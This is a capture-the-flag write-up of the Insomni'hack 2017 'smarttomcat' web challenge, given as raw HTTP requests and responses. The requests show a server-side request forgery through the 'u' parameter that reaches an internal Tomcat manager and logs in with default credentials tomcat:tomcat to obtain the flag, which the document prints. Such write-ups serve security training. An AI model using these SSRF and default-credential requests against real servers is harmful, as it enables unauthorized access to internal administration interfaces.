# smarttomcat - Web - 50 pts - realized by xel/grimmlin

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 55
DNT: 1
Connection: close

u=http://localhost:8080/index.jsp?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:41:29 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 32
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent



Tomcat not found ! Try again
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 53
DNT: 1
Connection: close

u=http://localhost:8080/manager?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:54:35 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 195
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html>
<head>
<meta http-equiv="refresh" content="0; url=http://127.0.0.1:8080/manager/html/" />
</head>
<body>
<p><a href="http://127.0.0.1:8080/manager/html/">Redirect</a></p>
</body>
</html>
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 58
DNT: 1
Connection: close

u=http://localhost:8080/manager/html?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:54:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 969
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 401 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>This request requires HTTP authentication.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 72
DNT: 1
Connection: close

u=http://tomcat:tomcat@localhost:8080/manager/html?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:55:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 91
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
```
